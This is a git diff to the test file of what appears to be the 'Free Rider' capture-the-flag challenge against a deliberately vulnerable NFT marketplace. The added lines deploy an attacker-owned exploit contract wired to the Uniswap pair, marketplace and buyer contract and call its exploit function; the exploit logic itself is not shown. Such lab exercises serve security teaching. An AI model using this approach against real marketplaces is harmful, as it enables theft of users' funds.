@@ -105,6 +105,18 @@ describe('[Challenge] Free Rider', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // console.log(parseFloat(await this.token.balanceOf(attacker.address)))
+        // console.log(parseFloat(await ethers.provider.getBalance(attacker.address)))
+        const marketPlaceExploit = await ethers.getContractFactory('ExploitMarketplace', attacker); 
+        this.contract = await marketPlaceExploit.deploy(
+            this.uniswapPair.address,
+            this.marketplace.address, 
+            this.buyerContract.address
+        )
+        expect(await this.contract.buyer()).to.be.eq(this.buyerContract.address); 
+        expect(await this.contract.owner()).to.be.eq(attacker.address); 
+
+        await this.contract.exploit(NFT_PRICE); 
     });
 
     after(async function () {
